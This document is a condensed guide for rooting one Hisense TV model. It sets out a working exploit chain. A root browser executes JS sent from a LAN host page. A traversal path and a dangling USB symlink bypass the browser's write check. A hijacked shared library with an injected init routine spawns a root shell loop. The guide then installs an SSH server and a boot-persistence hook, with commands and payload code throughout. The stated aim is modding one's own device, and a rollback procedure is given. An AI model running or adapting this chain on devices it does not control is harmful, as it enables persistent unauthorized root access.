# Root guide (condensed, sanitized)

End-to-end procedure for the validated reference device. Substitute your own
values for `${TV_HOST}`, `${TV_USER}` (default `root`), `${SSH_PORT}` (default
22) and `${SSH_KEY}` (optional private key path).

**Validated:** Hisense HE40E5600FFWTS, firmware `V0100.01.00A.N0410`.
**Not validated for this chain:** 100U7Q / MT9655 and every other model.
100U7Q has its own verified path, with a different mechanism and no shared
code: [`../../100u7q/`](../../100u7q/).

No flash, no `.pkg`, no UART, no case opening. The read-only root filesystem is
never modified; all changes live in `/3rd_rw` and in runtime bind mounts.

## 0. Result

At boot, `hisense_browser` (UID 0, single process, full `CapEff`) loads a
prepared `libtvsysinfo.so` from `/3rd_rw/loglevel/lib`. The appended `DT_INIT`
runs as root, writes the proof file, starts the root loop and then calls the
original init. A `HamService` wrapper starts the root loop and Dropbear on every
boot. SSH is key-only; `root` gives a real root shell with a PTY.

Expected proof after a successful boot:

```
/3rd_rw/root_proof.txt = ROOT_EXEC_TVI
uid=0(root) gid=0(root)
CapEff: 0000003fffffffff
```

## 1. Why it works

1. **Browser is root.** `hisense_browser` runs as UID/GID 0, full capabilities,
   no seccomp/no-new-privs. JS in the browser is root-equivalent.
2. **USB write primitive.** `HSJSX_File::IsSubDentry` checks `realpath` plus a
   prefix against `/3rd_rw/appdata`, `/dev/shm/shm_tmp` and
   `/3rd/launcher/data`. A dangling symlink on an ext4 USB makes `realpath`
   fail, so the parent prefix check passes; `fopen` then follows the symlink and
   creates the target file as root.
3. **Loader shadow.** `hisense_browser` has `libtvsysinfo.so` as a direct
   `NEEDED`. `DT_RPATH=/lib/` does not contain it, and `LD_LIBRARY_PATH` entry
   17 is `/3rd_rw/loglevel/lib` — the first writable directory that can provide
   the library.
4. **Payload.** The stock library is extended with code at EOF; the executable
   `PT_LOAD` gets a larger `p_filesz/p_memsz` and `DT_INIT` points at the new
   code. The code unlinks its own file, writes the proof, forks
   `execve("/bin/sh", ["/bin/sh", "/3rd_rw/appdata/root_loop.sh"])`, calls the
   original init and returns to the loader.

## 2. Prerequisites

- Host in the same LAN as the TV, Python 3, `arm-linux-gnueabihf-*` toolchain.
- Upstream sources you fetched yourself: Dropbear 2022.83 and OpenSSH 9.9p1.
- The stock `libtvsysinfo.so` from **your** TV (see your own firmware inventory;
  path is device-specific).
- An ext4 USB stick with an MBR partition table. The TV mounts partitions, not
  whole-disk filesystems ("superfloppy" does not work), and FAT32 cannot hold
  symlinks.
- Your SSH keypair. Only the public key goes to the TV.

## 3. Step 1 — USB stick (ext4 + MBR + dangling symlink)

```sh
sudo ./host/prepare_usb.sh --device /dev/sdX
```

The script is destructive and refuses to guess. It creates:

```
tvi -> /3rd_rw/loglevel/lib/libtvsysinfo.so   (required; must stay dangling)
pwn -> /3rd_rw/root_proof.txt                 (optional proof target)
```

The ext4 feature set is reduced (`^64bit,^metadata_csum`) because the TV kernel
is 3.18. Insert the stick; the TV mounts it at `/dev/shm/shm_tmp/mnt/usb/<dev>`,
visible to JS as `/mnt/usb/<dev>` (for example `sda1`).

## 4. Step 2 — host server + recon page

```sh
BIND=0.0.0.0 ./host/start_http.sh
# TV browser: http://${TV_HOST}:9000/recon.html
```

The server serves `recon.html`, `/cmd`, `/recon`, `/dump` and `/pub/*`. The page
polls `/cmd` and executes JS in the root browser. `/pub/` must contain the
payload, the binaries and `authorized_keys`.

On the TV, in the page console:

```js
listDir("/mnt/usb")        // e.g. "[D] sda1"
listDir("/mnt/usb/sda1")   // must show "tvi"
```

## 5. Step 3 — plant the payload

Build it first:

```sh
./host/build_payload.sh --target he40e5600 --input ~/stock/libtvsysinfo.so
```

Paste `host/plant_payload.js` into the console and adjust `usb`:

```js
var usb = "/mnt/usb/sda1";                 // <-- from listDir("/mnt/usb")
var target = "so/../../../../dev/shm/shm_tmp" + usb + "/tvi";
HiBrowser.File.download(location.origin + "/pub/libtvsysinfo.so", target, 1);
```

Expected: `download=0` and `back=0`, and the size/SHA-256 must match your build
output (the profile pins the reference hash). **Do not reboot until the bytes
are right.** Then power-cycle the TV; the browser loads the shadow library.

## 6. Step 4 — proof and command channel

Open the recon page again:

```js
fileXHR("file:///3rd_rw/root_proof.txt")         // ROOT_EXEC_TVI
fileXHR("file:///3rd_rw/appdata/root_loop.pid")  // a PID
listDir("/3rd_rw/loglevel/lib")                  // no libtvsysinfo.so => self-unlink ok
```

Root command through the loop (or paste `host/run_root_cmd.js`):

```js
HiBrowser.File.write("root_cmd.sh", "id\n", 1);
// after ~2 s:
fileXHR("file:///3rd_rw/appdata/root_out.txt")
```

## 7. Step 5 — Dropbear / SSH

1. `host/upload_to_appdata.js` downloads the deploy files into
   `/3rd_rw/appdata`. Expect every value to be `0`.
2. `host/run_root_cmd.js` with `/bin/sh /3rd_rw/appdata/deploy_sshd.sh`.
3. Connect:

```sh
ssh -p "${SSH_PORT:-22}" "${TV_USER:-root}@${TV_HOST}"
# with a non-default key:
ssh -i "${SSH_KEY}" -p "${SSH_PORT:-22}" "${TV_USER:-root}@${TV_HOST}"
```

`deploy_sshd.sh` installs the binaries, creates the host key, bind-mounts a
`/etc/passwd` copy (root home `/3rd_rw/sshd/home`), mounts devpts on
`/dev/shm/pts` and binds it over `/dev/pts`, installs `authorized_keys`, the
start script, the root loop and the `HamService` wrapper, then starts Dropbear
on `0.0.0.0:22` with key-only auth.

**PTY gotcha:** `/dev` is a static read-only squashfs (no devtmpfs). Mounting
devpts directly on `/dev/pts` fails; only the `/dev/shm/pts` + bind workaround
works. `/dev/ptmx` (5,2) stays the static node.

Fallback without PTY: `ssh -T ... 'id; uname -a'`.

## 8. Step 6 — boot persistence

`deploy_sshd.sh` installs `/3rd_rw/hamservice/HamService` as a wrapper that
starts the root loop and Dropbear, then `exec`s the real
`/3rd/hamservice/HamService`. `startHam.sh` runs it as root at boot.

Alternative early hook: `/3rd_rw/developer.sh`, executed by `/basic/autorun.sh`
(line ~90) **before** `ms_service`, `hisenseUI`, `app_man` and `delayrun`.

Reboot test:

```sh
ssh -p "${SSH_PORT:-22}" "${TV_USER:-root}@${TV_HOST}" 'id; ps | grep -E "dropbear|root_loop"'
```

## 9. Step 7 — SFTP (optional)

Dropbear has no built-in sftp-server; it execs the compile-time
`SFTPSERVER_PATH`. The rootfs is read-only, so this bundle builds a static
OpenSSH sftp-server and a Dropbear whose path points at
`/3rd_rw/sshd/sftp-server` (same string length, no ELF layout change).

```sh
./host/install_sftp.sh
```

It uploads both binaries, starts a **test Dropbear on 2222** (port 22 untouched),
tests `sftp -P 2222`, and only then swaps the binary on 22. The old binary is
backed up as `/3rd_rw/sshd/dropbear.nosftp`.

## 10. Rollback

```sh
/bin/sh /3rd_rw/appdata/rollback.sh
# reboot
```

It stops loop/Dropbear, restores the `HamService` symlink, unmounts
`/etc/passwd`, `/dev/pts` and `/dev/shm/pts`, removes `/3rd_rw/sshd` and the
shadow libraries. Manual equivalent:

```sh
kill "$(cat /3rd_rw/appdata/root_loop.pid)" 2>/dev/null
kill "$(cat /3rd_rw/sshd/dropbear.pid)" 2>/dev/null
rm -f /3rd_rw/hamservice/HamService
ln -s /3rd/hamservice/HamService /3rd_rw/hamservice/HamService
umount /etc/passwd 2>/dev/null
umount /dev/pts 2>/dev/null
umount /dev/shm/pts 2>/dev/null
rm -rf /3rd_rw/sshd
rm -f /3rd_rw/loglevel/lib/libtvsysinfo.so
sync
reboot
```

## 11. Troubleshooting

| Symptom | Cause / fix |
|---|---|
| `PTY allocation request failed` | `/dev/pts` is not devpts. Re-run the devpts + bind mount block, reconnect. |
| `Permission denied (publickey)` | `grep '^root:' /etc/passwd` must show `/3rd_rw/sshd/home:/bin/sh`. Check key file modes (700 dirs, 600 key), then `dropbear.log`. |
| `Connection refused` | Dropbear not running. Check `ps`, `dropbear.log`, `/proc/net/tcp` (`:0016`), start `start_sshd.sh`. |
| No root after payload | Size/SHA of the planted file; `/3rd_rw/loglevel/lib/libtvsysinfo.so` present; restart the browser. |
| `sh: /usr/libexec/sftp-server: No such file` | Unpatched Dropbear. Run `install_sftp.sh`; check `grep -a sftp-server /3rd_rw/sshd/dropbear`. |
| SFTP fails on 2222 | Read `/3rd_rw/sshd/dropbear2222.log`. Port 22 was not touched. |
| SFTP fails on 22 | Read `swap.log` and `dropbear.log`; restore `dropbear.nosftp` as shown by the installer. |
| Recon page gone | Reopen `http://${TV_HOST}:9000/recon.html`. SSH/root loop run independently. |

## 12. Verification status

| Item | Status |
|---|---|
| Browser root (UID 0, full CapEff) | confirmed live on the reference device |
| USB ext4 symlink bypass | confirmed live |
| `libtvsysinfo` shadow / `DT_INIT` | confirmed live (proof file, self-unlink) |
| Root loop / command channel | confirmed live |
| Dropbear SSH, port 22, pubkey auth | confirmed live |
| PTY / interactive shell | confirmed live |
| Payload build reproducibility | confirmed on the host (profile hash) |
| Boot persistence via `HamService` wrapper | installed; reboot test described above |
| SFTP | built and staged; verify on your own device |
| App tile / custom UI / bloat recipes | **UNVERIFIED** — see `known-unknowns.md` |

## 13. Limits

This guide describes one device family. Loader order, writable paths and boot
hooks are firmware-specific. After a firmware update, re-establish every fact
before reusing a payload. See `known-unknowns.md` and `dead-ends.md`.
